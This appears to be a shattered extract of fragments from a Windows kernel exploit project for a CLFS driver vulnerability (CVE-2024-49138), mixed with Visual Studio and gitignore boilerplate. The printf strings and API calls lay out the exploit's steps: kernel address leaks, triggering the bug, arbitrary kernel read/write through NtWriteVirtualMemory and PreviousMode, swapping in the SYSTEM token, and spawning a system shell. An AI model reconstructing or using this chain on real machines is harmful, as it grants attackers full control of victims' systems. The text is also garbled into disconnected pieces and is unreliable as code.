"(!AddLogContainer(logHndl, &cbContainer, (LPWSTR"
"(!EnumDeviceDrivers(drivers, sizeof(drivers"
"(""AddLogContainer failed with error %d\n"", GetLastError("
"(""AddLogContainer successful\n"""
"(""CreateLogFile failed with error %d\n"", GetLastError("
"(""Directory created successfully: %s\n"", directoryName1"
"(""Failed to create the directory. Error code: %lu\n"", error"
"(""Failed to enumerate device drivers. Error: %lu\n"", GetLastError("
"(""Failed to find resource. Error: %lu\n"", GetLastError("
"(""Failed to get addresses for NtReadVirtualMemory or NtWriteVirtualMemory\n"""
"(""Failed to get module handle.\n"""
"(""Failed to get real handle to the current thread. Error: %lu\n"", GetLastError("
"(""Failed to get resource size. Error: %lu\n"", GetLastError("
"(""Failed to load resource. Error: %lu\n"", GetLastError("
"(""Failed to lock resource. Error: %lu\n"", GetLastError("
"(""Failed to open output file. Error code: %d\n"", err"
"(""Failed to retrieve kernel name. Error: %lu\n"", GetLastError("
"(""Failed to set process priority. Error code: %lu\n"", error"
"(""Failed to set thread priority. Error code: %lu\n"", error"
"(""Kernel Base Address: 0x%p\n"", kernelBaseAddress"
"(""Kernel Name: %ls\n"", driverName"
"(""No device drivers found.\n"""
"(""NtReadVirtualMemory = 0x%p\n"", (DWORD64"
"(""NtWriteVirtualMemory = 0x%p\n"", (DWORD64"
"(""Overwriting process token..\n"""
"(""Process priority set to NORMAL_PRIORITY_CLASS.\n"""
"(""Process priority set to REALTIME_PRIORITY_CLASS.\n"""
"(""Resource size: %lu bytes\n"", resourceSize"
"(""Resource written to output.bin successfully.\n"""
"(""The directory already exists: %s\n"", directoryName2"
"(""Thread priority set to the highest level: THREAD_PRIORITY_NORMAL.\n"""
"(""Thread priority set to the highest level: TIME_CRITICAL.\n"""
"(""address_to_write = 0x%p\n"", (DWORD64"
"(""buf = 0x%p\n"", (DWORD64"
"(""cmd.exe"""
"(""current token address = 0x%p\n"", eprocess + TOKEN_OFFSET"
"(""file opened successfully\n"""
"(""hResource = 0x%p\n"", hLoadedResource"
"(""hResource = 0x%p\n"", hResource"
"(""pResourceData = 0x%p\n"", pResourceData"
"(""pcclfscontainer = 0x%p\n"", (DWORD64"
"(""performing NtWriteVirtualMemory..\n"""
"(""reading base of ntoskrnl to check we have arbitrary read/write\n"""
"(""swapping tokens...\n"""
"(""systemtoken = 0x%p\n"", systemtoken"
"(""token swapped. Restoring PreviousMode and spawning system shell...\n"""
"(""triggering vuln..."""
"(""vuln triggered\n"""
"(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"""
"(&file, ""C:\\temp\\testlog\\mylogdddd.blf.blf"", ""wb"""
"(CreateDirectoryA(directoryName1, NULL"
"(CreateDirectoryA(directoryName2, NULL"
"(GetDeviceDriverBaseName(kernelBaseAddress, driverName, MAX_PATH"
"(GetModuleHandle(L""ntdll"""
"(SetPriorityClass(processHandle, NORMAL_PRIORITY_CLASS"
"(SetPriorityClass(processHandle, REALTIME_PRIORITY_CLASS"
"(SetThreadPriority(threadHandle, THREAD_PRIORITY_NORMAL"
"(SetThreadPriority(threadHandle, THREAD_PRIORITY_TIME_CRITICAL"
"(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLength"
"(SystemHandleInformation, handleTableInformation, numberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO"
"(THREAD_ALL_ACCESS, FALSE, threadId"
"(hModule, MAKEINTRESOURCE(IDR_RCDATA1"
"(hModule, hResource"
"(lib, ""Clfsw32.lib"""
"(pResourceData, 1, resourceSize, file"
"(pcclfscontainer, 0, 0x1000"
(!NtReadVirtualMemory || !NtWriteVirtualMemory
(!hLoadedResource
(!hModule
(!hResource
(!pResourceData
('$(UserRootDir
((DWORD64
((HANDLE
((LPVOID
((PCHAR
((PDWORD64
()
(1
(1252
(AFX_RESOURCE_DLL
(AFX_TARG_ITA
(Configuration
(DWORD64
(ExtensibilityGlobals
(GetKAddrFromHandle(threadHandle
(GetProcessHeap(
(HANDLE handle
(Italia
(LPVOID
(MonoDevelop/Xamarin Studio
(NULL
(PDWORD64
(PSYSTEM_HANDLE_INFORMATION
(PTVS
(Platform
(PreprocessorDefinitions
(PreviousMode
(ProjectConfigurationPlatforms
(SYSTEM_HANDLE_INFORMATION
(SYSTEM_HANDLE_TABLE_ENTRY_INFO
(SolutionConfigurationPlatforms
(SolutionProperties
(ULONGLONG
(UserRootDir
(VCTargetsPath
(WINAPI*
(Xamarin productivity tool
([0-9]
([0-9][0-9]
(arg_DBGKPTRIAGEDUMPRESTORESTATE
(buf
(c
(contains which files were open etc.
(cross platform F# VS Code tools
(currenttoken
(currenttoken + TOKENPRIVILEGESPRESENT_OFFSET
(currenttoken + TOKENPRIVILEGSENABLED_OFFSET
(driverCount == 0
(drivers[0]
(eprocess
(eprocess + ACTIVEPROCESSLINKS_OFFSET
(eprocess + TOKEN_OFFSET
(eprocess + UNIQUEPROCESSID_OFFSET
(err == 0 && file
(error == ERROR_ALREADY_EXISTS
(fNtQuerySystemInformation
(fNtReadVirtualMemory
(fNtWriteVirtualMemory
(file
(hLoadedResource
(handleInfo.HandleValue == (USHORT
(https://github.com/github/gitignore/pull/1529#issuecomment-104372622
(https://github.com/github/gitignore/pull/2483#issue-259490424
(https://github.com/user-attachments/assets/788d4096-1c9c-46a6-ad52-988e6538dd18
(https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49138
(int i = 0; i < handleTableInformation->NumberOfHandles; i++
(logFileName.c_str(
(logHndl
(logHndl == INVALID_HANDLE_VALUE
(pid
(pid == (DWORD64
(pid == GetCurrentProcessId(
(resourceSize == 0
(sass
(systemtoken
(threadHandle == NULL
(with potential passwords
